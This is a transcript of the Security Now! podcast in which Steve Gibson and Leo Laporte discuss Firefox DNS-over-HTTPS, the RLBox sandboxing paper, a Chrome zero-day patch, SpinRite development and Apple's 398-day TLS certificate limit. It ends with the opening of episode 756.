But the ISPs warned that rolling out DoH would cripple the U.K.'s national firewall system, which ISPs and law enforcement are using to limit access to child abuse websites and copyright infringement domains.  After their lobbying efforts were joined by law enforcement and the British government, Mozilla themselves capitulated last summer, in July, and announced that they would not be enabling DoH for U.K. users, at least for now.  I presume individual U.K. users can also enable it, if they choose.  But it's just not going to happen by default.



So whether or not ISPs and governments like it, DoH appears to be where the industry is headed.  So I think this is going to end up being a transient upheaval, and those who are against it are going to end up losing.  It is now, as we last talked about this, supported by all major web browsers.  Even if it's not always easy to find the setting, it's in there.  And even Microsoft has announced plans to support DoH natively in Windows in the future.  So whereas right now, if you're using a browser with DoH DNS resolution on Windows, only your browser is getting the advantage of the encryption and security benefits of DoH.  If Microsoft moves it down into the OS and supports it natively, then all browsers, whether they're configured - as long as they're using the OS's DNS resolution, which is the typical default, and all other things, email and everything else on Windows, would get DoH.  And that suggests that we're probably going to see this go OS-wide at some point.



So it is still Cloudflare the default provider of Mozilla's DoH.  And that's a decision I wholeheartedly support.  Not only has Cloudflare formally asserted that they will not log nor monitor nor intercept this use of DNS over HTTPS in any way, but it's Cloudflare who is making that assertion, and there are few companies that I would trust more to actually honor their pledge.



LEO:  Good.



STEVE:  Yeah.  And if somebody for some reason doesn't want to use Cloudflare, just wants to be contrarian perhaps, Mozilla does offer, Firefox offers the selection of NextDNS, which is also another good group.  And so you can choose that if you'd rather not use Cloudflare.  So anyway, you'll get it if you haven't deliberately turned it off.  I've turned mine on, the  moment we started talking about it, the moment it appeared in the UI.  And my Firefox works just as well as my Chrome does.  So I don't see any downside.  And I'm not that worried about Cox, my ISP, my cable service, snooping on my web browsing, but they can't do it when I do it under Firefox.  And that's going to be the case for everybody by default, any new installations starting today.  And within a few weeks everybody should have it.



LEO:  Cool.



STEVE:  And in another piece of important Firefox news, we've got a new generation sandbox coming first, interestingly, on Firefox for Linux and Mac, and only a little bit later to Windows.  It's the result of a bunch of hard work by a team from UC San Diego, UT Austin, Stanford University, and Mozilla.  It brings the next step in protecting users, both from malicious and inadvertently exploitable libraries that their web pages may load.  There is a paper which the group has published.  It's up on GitHub.  I've got the link in the show notes.  It's titled "Retrofitting Fine Grain Isolation in the Firefox Renderer."  And to give our listeners a sense for what they've done, I'll share from the beginning of it.



They said:  "All major browsers today employ coarse grain privilege separation to limit the impact of vulnerabilities.  They run renderers, the portion of the browser that handles untrusted user content from HTML parsing, including JavaScript execution and image decoding and rendering, in separate sandboxed processes.  This stops web attackers that manage to compromise the renderer from abusing local OS resources to, for example, install malware."



They said:  "Unfortunately, this is no longer enough.  Nearly everything we care about today is done through a website.  By compromising the renderer, an attacker gets control of the current site, and often any other sites the browser has credentials for.  With services like Dropbox and Google Drive, privilege separation is insufficient even to protect local files that sync with the cloud.



"Browser vendors spend a huge amount of engineering effort trying to find renderer vulnerabilities in their own code. Unfortunately, many remain, frequently in the dozens of third-party libraries used by the renderer to decode audio, images, fonts, and other content.  For example, an out-of-bounds write in libvorbis was used to exploit Firefox at Pwn2Own 2018.  Both Chrome and Firefox were vulnerable to an integer-overflow bug in the libvpx video decoding library.  Both also rely on the Skia graphics library, which had four remote code execution bugs until recently.



"To appreciate the impact of these vulnerabilities and the difficulty of mitigating them, consider a typical web user, Alice, that uses Gmail to read email in her browser.  Suppose an intruder, Trudy, sends Alice an email that contains a link to Trudy's malicious site, hosted on sites.google.com.  If Alice clicks on the link, her browser will navigate her to Trudy's site, which can embed a .ogg audio track or .webm video to exploit vulnerabilities in libvorbis and libvpx and compromise the renderer of Alice's browser.  Trudy now has total control of Alice's Gmail account.  Trudy can read and send emails as Alice, for example, to respond to password reset requests from other sites Alice belongs to.  In most cases, Trudy can also attack cross site, i.e., she can access any other site that Alice is logged into, for example, Alice's Amazon.com account.



"Recent versions of Chrome, and upcoming versions of Firefox, support Site Isolation, which isolates different sites from each other, for example, *.chrome.com from *.amazon.com, to prevent such cross-site attacks.  Unfortunately, Trudy might still be able to access drive or pay or cloud.google.com" - because she has access now to gmail.google.com, so she could get drive.google.com, pay.google.com, or cloud.google.com - "which manage Alice's files, online payments, and cloud infrastructure, since the renderer that loads the malicious .ogg and .webm content might still be running in the same process as those origins."  Thus process isolation doesn't help.



They said:  "For many sites, Trudy might not even need to upload malicious content to the trusted victim origin, sites.google.com in our example.  Most web applications load content, including images, fonts, and video, from different origins.  Of the Alexa top 500 websites, for example, over 93% of the sites load at least one such cross-origin resource.  And the libraries handling such content are not isolated from the embedding origin, even with Site Isolation."  They conclude:  "To mitigate these vulnerabilities, we need to harden the renderer itself.  To this end, we extend the Firefox renderer to isolate third-party libraries in [what they're calling] fine grain sandboxes.  Using this, we can prevent a compromised library from gaining control of the current origin or any other origin in the browser."



So as we've often observed on this podcast, our web browsers  have become the largest attack surface that we routinely extend out onto the Internet.  By their very nature, web browsing is insecure.  It's inherently insecure.  We're actively soliciting sites we know little about or even trusted sites that we may trust, but they themselves may have been compromised.  Whatever.  Whether an unknown site or a trusted site, they are sending tons of code to our browser, which our browser interprets, and asks our browser then to fetch massive third-party libraries and advertisements from all over the Internet, running code that we've never seen before in the context of our browser.  We bring them all in, all of this stuff in to be processed, rendered, executed, and displayed.  I mean, I'm so happy we have these guys, and guys like them, watching our backs.  Lord knows we need it.



So this new technology is called RLBox, R-L-B-O-X.  It will first be deployed in Firefox 74 for Linux, which is set to be released early next month, so a few weeks from now, in early March.  Then the next month, in April, RLBox will ship for Firefox 75 for the Mac.  And its development in Firefox for Windows will eventually catch up.  So Firefox appears to be leading the industry as a result of this effort.  And I'm sure once the technique has been proven and has matured, I'll be shocked if Chromium doesn't go sort of basically follow Firefox to this next step and employ these fine-grained sandboxes in order to protect our browser environment from the libraries that they run.  Right now those libraries are running in process.  They are not being separately sandboxed from the pages that they load.  So that will be a good thing.



Also, just this morning, Chrome users running Chrome on Windows, Mac, and Linux were updated to 80.0.3987.122.  It's not a big problem.  I doubt it would affect anybody.  I checked, and that's the Chrome that I had.  It doesn't affect Chrome OS nor iOS or Android.  So just the desktop platforms.  It was released this morning to address three security bugs, including a zero-day vulnerability, which as its designation as zero-day implies was being actively exploited in the wild.  We don't yet know anything about the attacks, only that it has a CVE tracker which describes it sort of generically as a type confusion in V8, V8 being of course Chrome's JavaScript interpreter compiler.  We do know that the use of this bug in attacks was discovered exactly a week ago, on February 18, by a member of Google's Threat Analytics group that keeps watch on the things that Chrome encounters when its users are using it out on the 'Net.



This is, as I mentioned at the top of the show, the third zero-day that has been discovered in Chrome in a year.  The first one was last March, so it's almost exactly a year ago that the first one was found.  The second one was found in November, and the third one last week.  So, you know, this is to be expected, since Chrome has become the Internet's number one browser.  It's now the number one target.



So, SpinRite.  It is where I am finally, happily, spending all of my time.  I decided that in order to get back with the plan, I needed to go back and reread all of the newsgroup postings from 2013.  I began in May of 2013.  There were, well, if I eliminate the postings before and then the postings since the burst of work on 6.1, there were about 6,000 posts for the period that I was actively rolled up and working on 6.1.  I've read about 1,200 of the 6,000, so I have about 4,800 remaining.  And it has just been the most wonderful thing.  The way I tend to operate in the newsgroups is to sort of journal what I'm doing, and what I expect to do next, and what I'm going to try, and then the results of that.  I'm always producing incremental code for the gang in the newsgroup to experiment with and pound on, and they post their results.  So I'm able to get a broad cross-section of hardware through time.  It ends up being so useful.



But never before has there been a seven-year hiatus where I wanted to pick up where I was, but, you know, seven years.  So I completely forgot what I was doing back then.  And so this has just been incredibly useful for helping to bring me back up to speed.  It just saves a lot of time because basically I have a detailed log of the whole beginning of this project that is still there, and I'm able to plow back through it.



One of the things that - oh, and I have been producing some new code, and the gang that's hanging out at the newsgroups has been running the code.  I made a decision seven years ago which was the right decision then, and is not the right decision today, which was that the AHCI controller, which we all have to run our SATA drives, while the AHCI was a new spec, they had the option to operate in legacy mode.  And, I mean, there are still motherboards where that's the case.  And, for example, even Windows 10, I'm seeing posts out on the 'Net where people are asking, I installed Windows 10 when my motherboard or my system was set to legacy mode.  I want to switch it to AHCI mode, but I tried it, and it won't boot.  What do I do?  Well, it turns out there are ways to get the drivers installed and then switch over, and Windows 10 knows about it because it uses different drivers.



Seven years ago it was much more expedient for me to know that legacy mode was present and to have SpinRite 6.1 use legacy mode.  It is less sophisticated than AHCI.  But AHCI is this huge, it's like sort of this next-generation controller for hard drives that definitely makes sense if you're on a server platform in a multitasking environment and, arguably, even on a personal workstation, where there's just a lot of stuff going on.  But it didn't ever make sense for SpinRite, where basically you're in DOS, and SpinRite is saturating the use of the drive.



I mean, the things that AHCI provides, like very sophisticated command queuing, and you're able to chain jobs of things that you want the drive to do, in a chain of individual descriptor blocks.  And the controller itself, it's basically a little microcontroller.  It's able to read the descriptor block, see what it's being asked to do, and then go set the drive up and perform the transfer, reading this block of sectors into this block of memory.  And once it's done, it marks the descriptor as completed and then chains to the next one and so on.  So it's amazingly powerful.  But it was just, like, overkill, totally, for SpinRite seven years ago.  And it would mean that I was able to get 6.1 to its users - that was the original plan - a lot sooner, before SQRL, of course, came along.



Revisiting this today, it is no longer the case that legacy mode is ubiquitously available.  It's obviously still in some places, but lots of the users who are using my PCI enumeration code, which I wrote first seven years ago and then updated, it's just no longer the case that it is available.  And of course in order to fulfill my promise of having SpinRite run on contemporary systems, that means I have to support AHCI.  So that, I realized a couple days ago, that decision from then had to be revisited and changed.



So essentially I was also surprised to see how much I got done during that four-month sprint from May through August of 2013.  I have very mature code.  I've got the flat real mode stuff all working and well tested.  I'm able to allocate 32MB transfer buffers, not 32KB transfer buffers, and transfer 64,000 sectors at a time.  So all of the legacy stuff will stay there because of course it will run on motherboards that are in legacy mode or in earlier older hardware that didn't even have AHCI.  So all of that stuff will work with very large transfers, all bus mastering and operating the way we want.



And SpinRite will - the next thing I'm going to do is going to sit down and write AHCI support, add that to the platform that I already have.  And then once we get that integrated into SpinRite, we're ready for the next release.  I do have bad news on the Mac front.  I know that older Macs did have a BIOS compatibility built in because I had SpinRite running on my MacBook, it was my MacBook Air, years ago.  The reason SpinRite wouldn't run was that the Mac didn't emulate the keyboard hardware.  It emulated the keyboard through the BIOS.  The Mac uses a USB-based keyboard.  And so it provided BIOS emulation, but not hardware emulation.  When SpinRite starts up, it switches to reading the keyboard hardware, which is why the keyboard would freeze on people trying to run SpinRite on their Macs.  That was easy to fix, and I will fix it so that, for Macs that do have that BIOS emulation, SpinRite will run on the Macs with no trouble.



The problem is Apple dropped the BIOS emulation in more recent Macs.  They are UEFI only, and SpinRite is not going to run on them soon.  SpinRite will eventually run on them because Intel has also announced their intention to drop BIOS support for future hardware platforms moving forward.  So for now, because FreeDOS doesn't even begin to think about running on top of UEFI, no DOS runs on the EFI platform, that's a complete deal breaker.  So it's clear that the only future SpinRite has is if it's also able to run on EFI.  So I think I'm going to have to do that before I switch over to the plan for a complete SpinRite rewrite because EFI is coming, and it'd be nice to be there ahead of that, rather than always being behind the curve.



So anyway, that's where I am at this point.  I've got still a lot more postings to read and catch up from the past.  6.1 will support AHCI, which was not my plan seven years ago, but times have changed since then.  And I will have something that runs on current PC hardware.  I don't know when.  I never know when.  But it's all I'm doing now, so I'm excited to be back at it and to be working on it.  Just it makes me feel good, makes everybody feel good.  So I'm glad for it.



LEO:  Nice.  Well done.



STEVE:  Something that did not make everyone feel good happened last week.  Pause for a sip.  The first I learned about it, before it was even in the press, was a letter that I received from Dean Taylor, who's the senior account manager at DigiCert.  He said:  "Dear Steve.  Earlier today Apple announced that Safari will only trust certificates with a validity of 398 days or fewer, that is to say one year plus a renewal grace period."  He said:  "This policy goes into effect September 1st of 2020."  And it's like, what?



So Apple announced last week, Apple announced that Safari will only trust certificates having a validity period, that is, the time from first valid, what do they call it, valid after and then not valid after, something like that.  They have a very specific way of delineating when the certificate becomes valid and then when it expires.  The point is that, if the span of those dates is greater than 398 for any certificates with a valid, a first valid date of September 1st or later, that is to say, issued after August 31st of 2020, if that span is greater than 398 days, it will not be trusted by any Safari on any Apple device - iOS, Mac, tvOS, iPad OS, anything.



So Dean goes on in his letter which is announcing this to me as a DigiCert customer:  "Certificates issued before that date are not affected and do not need to be replaced or modified.  You can continue to issue two-year certificates until August 1st, 2020" - and I think I will - "and use them until their expiration.  This announcement was made by Apple," he says, "on February 19th at the CA/Browser Forum, an industry standards group meeting.



"While it's generally accepted that short-lived certificates will increase the security of the SSL ecosystem, we've been working with the browsers to time this change in a way that reduces the impact to our customers.  While Apple's decision was unilateral, we already have tools in place to make short-lived certificate management easier, and we're working on additional solutions ahead of this change to offer you greater certificate lifecycle automation options."



He says:  "I know this impacts your certificate management practices.  That's why I wanted to let you know about the coming change and tell you that we are responding.  At DigiCert we always put..." and blah blah.  He goes into, you know, marketing speak.  But he said, oh, here he said something:  "Before the Apple changes occur, we'll add the ability for you to purchase multiyear certificate subscriptions to smooth planning and reduce the yearly work of buying and installing certificates. These subscriptions will let you reissue, renew, or replace a certificate as frequently as you need to without incurring additional fees.  Our intention with offering subscriptions is to save you time and money."



And then he says:  "Hand in hand with your multiyear certificate subscriptions is the ability to automate the entire certificate lifecycle.  As the industry moves to shorter certificate lifetimes, automation is the key to keep your business running smoothly.  To save time, avoid annual manual updates, and to avoid site downtime, DigiCert CertCentral offers you several ways to automate your SSL certificate needs:  robust APIs, ACME integration, and our certificate automation tool.  Automation allows you to spend more time doing what you want to do and less time managing certificates.  If you have any questions," blah blah blah.



Okay.  So remember, like, where we've come from.  Back when this podcast was just beginning, when Honey Monkeys were crawling around, and come to think of it, when Leo's favorite password itself was "monkey"...



LEO:  Monkey123, yes.



STEVE:  It was possible to obtain an SSL certificate from a certificate authority which would remain valid for eight to 10 years.



LEO:  Oh, I wish I had.



STEVE:  Oh, from the time of its purchase.



LEO:  Actually, it would have expired by now.



STEVE:  Yeah.  Then, in 2011, the certificate authority, the CA/B, the Certificate Authority Browser Forum, CA/B Forum, which included all of the browser makers and the certificate authorities, decided that was too long, due to the, as we know, the enduring flakiness of certificate revocation and the possibility that a rogue certificate might escape and be honored for as many as 10 years.



LEO:  Yeah.  That's too long, for sure.



STEVE:  That's too long.



LEO:  And just as a sidebar, we've talked about revocation for a while.  There's no notion that it would be - it really isn't technically doable; right?



STEVE:  It technically is.  It is.



LEO:  You've always said it could be done; right?



STEVE:  Well, we have the technology to do it.  It's called "stapling."  The idea is that - so the problem with revocation is that OCSP, the Online Certificate Status Protocol, the OCSP servers have historically been flaky.  And they could be DDoSed, for example.  So the idea would be the browser gets a certificate.  And it looks at it and goes, oh, I need to see if this is still valid, you know, if it's a valid certificate.  It then makes a query to the OCSP URL that is in the certificate.  The certificate says you are free to check the current status of this claimed to be and valid by calendar certificate at this URL.  So the browser goes and queries the OCSP server.  The OCSP server is run by the certificate authority that signed the certificate.  And it says, yeah, that's valid right now.  No revocation.



LEO:  So the advantage of that is that's instantaneous revocation.  The disadvantage is, and nobody I guess wanted to assume the cost of this check to OCSP every time you check the cert.



STEVE:  Yes.  The temporal cost of...



LEO:  Yeah.



STEVE:  I mean, because even that, even that slows down the presentation of the page.



LEO:  And everybody wants pages to load instantaneously.



STEVE:  Yes.



LEO:  So this would be a preferable situation, but nobody's willing to do it.  No browser is going to slow it down that much.



STEVE:  Well, but there's more, Leo.  Then, to solve that problem, the really cool innovation known as "stapling" occurred.  With stapling, the web server which is sending out the certificates to be trusted, it periodically gets a signed OCSP statement and staples it to the certificate.



LEO:  Oh.  So it does that behind the scenes.



STEVE:  Yes.



LEO:  Doesn't slow you down.



STEVE:  Exactly.  So the browser receives the certificate and a recently updated affidavit signed by the certificate authority saying, yes, we are reasserting an hour ago that this certificate is still valid.



LEO:  What would the typical stapling window be?



STEVE:  It could be a few hours.  The idea is that, as the server begins to see that its current certificate attestation is getting near the end of its life, like a few hours, it starts asking for an update from the certificate authority's OCSP.  It updates it, staples it, and then sends the certificate.



LEO:  So why didn't we do this?



STEVE:  I know.  Once upon a time it wasn't widely available.  All the web servers now support OCSP stapling.  So - I know.  The problem has been solved.



LEO:  So this would have been preferable because, instead of having a three-month or a one-year expiration, you could revoke a certificate within a matter of hours.



STEVE:  Correct.



LEO:  So far preferable, from a security point of view.



STEVE:  Even better than a one-year expiration.



LEO:  Because now a phony certificate could be as good as a year long; right?



STEVE:  It could.  It could.  Right.  Right.  And that's why also Apple just sort of, I don't know, that's why I think there was probably more going on behind the scenes. 



LEO:  Yeah, politics.



STEVE:  Yes.  I looked for - this is, like, every - this is a big deal.  Basically this cuts maximum certificate life in half.  It had been two years.  Now it's one year.  And it was not done by consensus.  It was done unilaterally by Apple.  They've got 17% of the browser share.  No webmaster is going to have a certificate that no iOS or Mac user can trust, you know, that brings up warnings that the browser won't show them.  So, I mean, Apple was big enough to pull off a unilateral coup, essentially.



So as a consequence there's a lot of fur flying.  I looked for something definitive, and I found it, again from my favorite certificate supplier.  This is from Dean Coclin, C-O-C-L-I-N, the Director of Business Development.  And he did a posting that was titled "DigiCert's Position on One-Year Certificates."  And it provides some additional background information that I thought our listeners would find interesting.  And it's not hype.



He said:  "At the CA/Browser Forum in Bratislava, Slovakia this week" - and that was last week - "Apple announced that beginning September 1st, newly issued publicly trusted TLS certificates are valid for no longer than 398 days.  This followed a long history of the CA/B Forum community working to reduce certificate lifetimes and improve security, while balancing the needs of business owners in transitioning to shorter validity certificates.



"In August 2019" - okay, so that was last summer - "CA/B Forum Ballot SC22 was introduced by Google to reduce TLS certificate validity periods to one year.  CAs reviewed this proposal with their customers and produced thousands of comments from users, which mostly showed opposition due to the additional work required by IT teams to handle shorter validity periods.  The ballot failed in the Forum, which meant certificate maximum lifetimes remained at two years.



"At one time, certificates were offered with a maximum validity of three years.  A few years ago they were reduced to two.  Fast-forward to this week's Apple announcement, which ultimately does what Ballot SC22 failed to do:  reduce certificate lifetime to one year."  He asks rhetorically:  "Why did Apple unilaterally decide to enforce a shorter certificate lifetime?  Their spokesperson said it was to 'protect users,' he has in quotes.  We know from prior CA/B Forum discussions that longer certificate lifetimes proved to be challenging in replacing certificates in the case of a major security incident.  Apple clearly wants to avoid an ecosystem that cannot quickly respond to major certificate-related threats."  But again, Leo, your point is perfect, and that is, okay, so it's still a year.



LEO:  That's a long time.



STEVE:  You could do a lot of damage in a year.



LEO:  It would have been a lot better to put the energy behind OCSP and stapling.



STEVE:  Yes.  Yes.



LEO:  In my opinion, your opinion.



STEVE:  Yes.



LEO:  It's bizarre, to be honest.  Google does this, too.  I mean, they did this with TLS.  They do these kind of...



STEVE:  Yes, unilateral.



LEO:  Unilateral.



STEVE:  We're going to throw our weight around.



LEO:  Right.  We're powerful.



STEVE:  Because we - yeah.  So who knows, like, what politics was going on behind the scenes.  My guess is, as I said at the top of the show, I bet not everybody was surprised by Apple's statement.  I'll bet you the other browsers, they were kind of hobnobbing and like, you know...



LEO:  They may have drawn straws.  Apple might have actually gotten the short straw.  Like it could be Firefox, Google, Apple all got together, look, somebody's got to do this.  I've got three straws.  Short straw announces.  Because any one of them's big enough market share that it forces the hand.  So maybe Apple didn't want to do this.  I don't know.  We just don't know.



STEVE:  Yeah.  He said:  "Apple clearly wants to avoid an ecosystem that cannot quickly respond to major security-related threats.  Short-lived certificates improve security because they reduce the window of exposure if a TLS certificate is compromised.  They also help remediate normal operational churn within organizations by ensuring yearly updates to identity such as company names, addresses and active domains."



LEO:  That's fine.



STEVE:  That's kind of a good point.



LEO:  And Let's Encrypt is three months.  And if you're using a Let's Encrypt cert, you don't have to worry about this.  Problem is we use wildcard certs.  And so I can't use Let's Encrypt.  I have to go through a fairly elaborate rigmarole manually.  I guess we'll have to automate it.  Do you think they'll go shorter than a year?  Like this is the first in a series?



STEVE:  I think this is.



LEO:  Yeah.



STEVE:  I think, yeah, I think that this all - it doesn't really force automation.  But, like, I mean, there are, I mean, as I told our listeners a couple weeks ago, I recently decided, okay, I've got all kinds of subdomains, you know, sqrl.grc.com, blog.grc.com.  I'll have a spinrite.grc.com.  I mean, I'm liking that.  I was also liking having EV certs, but they don't allow wildcards.



LEO:  And those are gone anyway now; right?  I mean, they've gone away.



STEVE:  Well, and they no longer show you any little extra bling in the browser's URL.  So it's like, okay.



LEO:  So what's the advantage?



STEVE:  Yes.



LEO:  So somebody's saying Let's Encrypt does do wildcards.  See, maybe we should just go to Let's Encrypt because that's free.



STEVE:  Yeah.



LEO:  Maybe we should just go to Let's Encrypt.  We just unfortunately bought two years for both twit.tv, you know, *.twit.tv and *.techguylabs.com.  But in a couple of years maybe we'll just all go to Let's Encrypt.



STEVE:  Well, so I think we're going to see automation.  We heard them say, you know, because first I was thinking, wow, you know, not only does it double the work on the user side, it doubles the work on the issuer side, if they're going to have to reverify this twice as often.  And then I realized, oh, that's this idea of having a subscription.  The idea is you could, I mean, that gives them some lock-in, which they like.  You're subscribing for a longer period of time.  I'm sure you get a better rate per year for the more years you subscribe.  Then on some sort of schedule they will reverify your identify.  But as long as you have a subscription, then you're able to reissue your own certificates.



And frankly, that's the way DigiCert already works.  When I reissued my own hybrid non-EV *.grc.com, which is what I did, and www.grc.com and grc.com, when I reissued that, I did it myself in the middle of the night because DigiCert already has the automation where they know how old their certification of me is, and they periodically call up and say, hey, just want to make sure you're still answering the phone and you haven't moved and blah blah.  I say, oh, yeah, still me.  Sometimes they'll send me a file that I have to stick on the root of GRC to re-prove my ownership of the domain.



LEO:  Yeah, we have to do that kind of thing, yeah.  In fact, we're about to do that.  We've got the CSR and the whole thing.



STEVE:  Yeah.



LEO:  So why not use Let's Encrypt?  Shouldn't we all, I mean, is there a - it's free; right?  I pay - you and I pay a lot of money for these things.



STEVE:  Yes.  I still sort of think that - okay.  So the problem is there is massive fraudulent use of Let's Encrypt.  Every possible misspelling of PayPal that you can imagine...



LEO:  Why wouldn't they?



STEVE:  ...has a certificate now from Let's Encrypt.  And I think that browsers, you know, they used to show us what was secure and what wasn't.  Then they went away from that, where we're assuming security.  They used to show us what was EV and what wasn't, and then they went away from that.  I'm betting someday they're going to show us whether the certificate was issued without verification.



LEO:  Oh, automated or not, yeah.



STEVE:  Yes.  Because what you and I are getting from wherever you're getting yours, I'm getting mine from DigiCert.



LEO:  We were DigiCert, and then Russell said, you know, it's about half as expensive at GoDaddy.  And as much as I hate GoDaddy, it's still 800 bucks for two years.  So, you know, it would have been more.



STEVE:  Yeah.  So what Let's Encrypt, the only thing they can issue are DV certs, Domain Validation.  I'm using and you're using OV certs, Organization Validation.



LEO:  Oh, yeah, that's right.



STEVE:  And so I'm just kind of thinking, at some point, as automation happens, as anybody could, I mean, anybody anywhere can get a domain that is a spoofed domain that's PayPal misspelled somehow, and now have a security certificate for it.  No serious certificate authority worth their salt would issue a certificate for a domain clearly intended to spoof a valid, well-known domain like PayPal.  So that's sort of the last vestige of integrity is was there a human in the loop at the certificate authority who said, "Yes, you guys are real."  And at the moment, that isn't shown.  But I have a sense in the future it'll be a means of giving the user some additional sense because once the world goes HTTPS, even the malware all is now HTTPS because they're all using Let's Encrypt.



LEO:  Yeah.



STEVE:  And DigiCert is using ACME.  ACME is that automation protocol.



LEO:  That's what LE uses, as well; right?  They use that, yeah.



STEVE:  Yes, yes, yeah.  Although they're backing it up with - they're able to issue organization verification certs.



LEO:  Right.  That's what I want.  Right.



STEVE:  Because, yeah, I really think you do.



LEO:  Yeah.  It's only 800 bucks a two-year cert, so it's not awful.



STEVE:  Yeah.  And so I don't think that - they're certainly not going to charge $800 for a one-year cert.  They'll probably...  



LEO:  Yeah, sell me two one-year certs.



STEVE:  Well, or say, hey, do you want to, are you willing to commit to stay with us for 10 years?  If so, we'll give you a discount, I mean, just like domain names are.  We'll give you a discount if you buy a longer period of time.  And during that time, you'll be able to reissue, and in fact you'll have to reissue, at least every year.  But you'll be able to reissue any time you want to within the validity period of that subscription.  So basically we're changing the way we interact with certificate authorities.  And once that's happened, Leo, as you forecast, I think we'll be dropping to even more often than once a year because we'll have the mechanisms in place.  But again, we solved the problem with stapling.  It's a perfect solution.  And it's like, oh, well, yeah, hmm.  We're not going to do that.



LEO:  If I were DigiCert, I'd be pissed because it does feel like maybe they're going to be putting them out of business.  Like the goal is, well, maybe not.  But, I mean, honestly, a lot more business will go to Let's Encrypt.



STEVE:  They're putting pressure.  Yes, yes.  Although also it turns out these certificate authorities are generating certificates for all kinds of other things.  Enterprises have really expansive needs for authenticating endpoints, and things that, well, remember you can't get a certificate from a CA for a non-public domain.  So enterprises have all kinds of other needs for certificates for authenticating their own internal VPNs, all their internal connections.  And apps are often signed with certificates that are only recognized by enterprise.  So there's all kinds of other uses, too.  But anyway, Apple just said...



LEO:  What a surprise.  Apple just did this, yeah.



STEVE:  Yeah.  We're us.  We're just going to force it.



LEO:  Yeah.



STEVE:  Even though just six months ago a consensus ballot failed.



LEO:  I've got this new conspiracy theory.  They got together, and they drew straws.



STEVE:  Spin the bottle, yeah.



LEO:  Apple got the short straw.  You're going to announce it.  We all want to do it.  You're going to announce it.  And then it'll be forced.  The issue is forced.  Okay.  Thank you, Steve.



STEVE:  I'm going to get back to work on SpinRite.



LEO:  Yay.  Details at GRC.com.  That's where you'll find, not only SpinRite, the latest version.  If you buy a version today, by the way, you'll get the new version when it comes out.  So don't worry about upgrading.



STEVE:  Actually, if you buy it today, you get all the pre-release versions before it comes out.



LEO:  Oh.



STEVE:  Because you'll be able to use your serial number or transaction code in order to get access, pre-release access.



LEO:  Nice.



STEVE:  So there's a little spiff there, too.



LEO:  Yeah.  I bet there's a few people using it who have not yet paid for it.  So here's an opportunity to make yourself right with the world and get some nice benefits.  GRC.com.  Steve has lots of free stuff, too, including ShieldsUP!, his famous, world-famous routing checker.  If you listen to the show, you might want to get it there.  He has 16Kb versions, that's the smallest file size, and English-language human-written transcriptions, which is great if you like to read along while you listen.  That's all at GRC.com.



We have the show, as well, 64Kb audio, hundred whatever video, big.  And you can get that at TWiT.tv/sn.  It's also on YouTube.  Best thing to do is subscribe in your favorite podcast application.  You can get it that way.  Just search for Security Now!, or better yet, search for TWiT.  Subscribe to all the shows you want, and then they'll automatically be downloaded, and you'll never be without stuff to listen to on your device.  We record the show every Tuesday, 1:30 Pacific, 4:30 Eastern, 21:30 UTC.  If you want to stop by and watch you can, or listen, audio and video streaming at TWiT.tv/live.  If you're doing that, join the chatroom at irc.twit.tv.



We had a little outage yesterday.  The chatroom went out, the wiki went out, and most importantly from our point of view, the RSS feeds went out.  Our server company, Contegix, had a switch failure.  They rebooted and failed again.  It took them about a couple hours, five hours something, to get back.  So if you were a little slow getting the downloads yesterday, or maybe couldn't get in the chat, that's why.  But it's all okay now.



If you're going to be at RSA, we will see you tomorrow.  Don't forget to email tickets@twit.tv or go to TWiT.tv/blog to get the secret password for the fabulous LastPass party.  Steve is on the Twitter at @SGgrc.  That's a good place to leave questions for him.  He takes DMs from anybody, and he tweets there regularly, too.



STEVE:  And speaking of LastPass, I have confirmed my participation in the next event with you, Leo.



LEO:  This fall.  We're going to do an event in San Francisco.  And everybody will be invited to that.  We'll give you details to follow.



STEVE:  Yeah.



LEO:  Thank you, Steve.  I can't wait.  You and Lorrie coming up?  Dinner's on me.



STEVE:  It'll be great, yup.



LEO:  We're going to have a lot of fun.



STEVE:  We will indeed.



LEO:  Yeah, there's good restaurants in San Francisco, I hear.  I hear that.



STEVE:  Is it actually going to be in the city?  All I knew was the Bay Area.



LEO:  I think so.  I don't know.  You know what, ask Laura.  She's in charge.  I should never talk out of school because I'm the last person who knows.  Thank you, Steve Gibson.  Have a great week, and we'll see you next time on Security Now!.



STEVE:  Right-o.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#756

DATE:		March 3, 2020

TITLE:		Kr00k

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-756.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a significant milestone for Let's Encrypt; the uncertain future of Facebook, Google, Twitter and others in Pakistan; some revealing information about the facial image scraping and recognition company Clearview AI; the Swiss government's reaction to the Crypto AG revelations; a "must patch now" emergency for Apache Tomcat servers; a revisit of OCSP stapling; a tried and true means of increasing your immunity to viruses; an update on SpinRite; and the latest serious vulnerability in our WiFi infrastructure, known as Kr00k.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  We've got Let's Encrypt's one-billionth certificate, just in time for a major security problem that they're rushing to fix.  We'll have the details on that.  Also, the new Kr00k vulnerability at WPA3.  Steve has a prescription that'll keep you safe.  And we're going to talk about Clearview AI, the face recognition that was used by a lot more people than anybody thought.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 756, recorded Tuesday, March 3rd, 2020:  Kr00k.



It's time for Security Now!, the show where we cover your security, your privacy, your health, your happiness, your welfare, online and off.  In fact, this show is the one show you need to get everything you need for the rest of your life.  That's Steve Gibson right there.  He's the man in charge, giving you the Vulcan salute.  He's at GRC.com.  Note we both have our "I Voted" stickers.



STEVE GIBSON:  Yes, we do.



LEO:  Nice job.  Nice job.  I got up early because I had to go before iOS Today.  So I got up early.  It's a nice feeling.  You go, and it's in a school.  The volunteers are all there.  I said, "Thank you for your service and helping us vote Super Tuesday."



STEVE:  And down here every single person in the area received a mail-in ballot.  Was that California-wide, or only in Orange County?



LEO:  No, it might be California-wide.  I mean, I've always been an absentee voter.



STEVE:  Yeah, as have I.



LEO:  But I got my ballot, and I had the good sense to wait.  I marked it, which is a good thing because the candidate I voted for had dropped out by the time the election happened.  What happens then?  They still get the votes.  And then I guess they can give their delegates...



STEVE:  And so they're able to sort of like say, oh, wow, we would have done better than we thought.  But, you know...



LEO:  Too late.



STEVE:  Yeah.



